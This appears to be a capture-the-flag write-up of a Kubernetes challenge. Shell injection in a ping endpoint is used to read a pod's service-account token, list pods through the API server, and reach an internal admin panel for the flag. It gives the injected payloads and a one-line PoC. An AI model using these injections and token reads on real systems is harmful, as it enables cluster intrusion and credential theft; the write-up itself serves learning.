# Vulnerability

1. User input is executed by a shell, allowing remote command execution.
2. Excessive access for a service account attached to backend pod, so with extracted token from it, access to cluster can be established with connecting to API server directly. 
3. Pods in different namespaces can send requests to each other without any limitation like Network Policy. In k8s, pods from different namespaces can curl each other with just having IP:PORT. Namespace itself does not provide network isolation ( unlike name, permissions and ... isolation ) and for isolating pods from different namespaces, we should create network policies.


# Extraction

Now using token with excessive access from service account attached to backend pod, I can access the k8s API server and get the list of pods, services, namespaces and ...

I got this list of pods using this command injected to ping service :

```
google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.96.0.1/api/v1/pods
```

and found pod admin-panel in its response with IP:PORT 10.244.2.2:5000.

```
{
      "metadata": {
        "name": "admin-panel-678d5cdbfc-kj2t7",
        "generateName": "admin-panel-678d5cdbfc-",
        "namespace": "internal-tools",
        "uid": "45c88763-5655-4316-9527-612cac64337e",
        "resourceVersion": "772724",
        "creationTimestamp": "2026-08-19T14:17:37Z",
        "labels": {
          "app": "admin-panel",
          "pod-template-hash": "678d5cdbfc"
        },
        "ownerReferences": [
          {
            "apiVersion": "apps/v1",
            "kind": "ReplicaSet",
            "name": "admin-panel-678d5cdbfc",
            "uid": "17ce4349-2e8c-4e75-955b-cf17a2b01cda",
            "controller": true,
            "blockOwnerDeletion": true
          }
        ],
        ...
        "containers": [
            {
            "name": "admin-panel",
            "image": "ctf/admin-panel:latest",
            "ports": [
              {
                "containerPort": 5000,
                "protocol": "TCP"
              }
            ],
        "podIP": "10.244.2.2",
        "podIPs": [
          {
            "ip": "10.244.2.2"
          }
        ],
```

So I sent a request to admin-panel pod from backend pod using command injection in ping service with this input:

```
google.com; curl 10.244.2.2:5000
```

and got this response:

```
$ ping -c 2 google.com; curl 10.244.2.2:5000
<!DOCTYPE html>
<html lang="en">
<head><title>Admin Panel</title></head>
<body>
<h1>Admin Panel</h1>
<p>Internal administration console. Restricted.</p>
<!-- FLAG -->
</body>
</html>
```

and flag is found in the response.

# PoC

```
curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{"host": "google.com; curl 10.244.2.2:5000"}' | jq -r '.output' | grep -oP 'HAMAMOOZ{[^}]+\}'
```